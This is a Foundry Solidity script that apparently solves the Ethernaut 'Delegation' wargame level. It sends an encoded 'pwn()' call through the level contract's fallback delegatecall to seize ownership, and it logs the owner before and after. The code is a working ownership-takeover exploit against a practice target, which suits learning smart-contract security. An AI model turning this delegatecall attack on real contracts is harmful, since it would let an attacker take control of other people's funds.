// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {EthernautL7} from "../src/EthernautL7.sol";
import {Delegate} from "../src/EthernautL7.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract EthernautL7Script is Script {
    bytes data = abi.encodeWithSignature("pwn()");

    EthernautL7 public ethernautl7 =
        EthernautL7(0xAf12F29c84b2A007b640A8B1026B262E7DC68af8);

    Delegate public delegate =
        Delegate(0xFf745ce90A940275d60a7b70d767648C9FaE5182);

    function run() external {

        // Check who is the owner of the Delegate contract
        address ownerOfDelegate = ethernautl7.owner();
        console.log("Owner of Delegate: ", ownerOfDelegate);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Call the pwn function of the Delegate contract
        (bool success, bytes memory data) = address(0xAf12F29c84b2A007b640A8B1026B262E7DC68af8).call(data);
        vm.stopBroadcast();

        // Check who is the owner of the contract
        address ownerOfDelegateAfter = ethernautl7.owner();
        console.log("Owner of Delegate after: ", ownerOfDelegateAfter);
    }
}
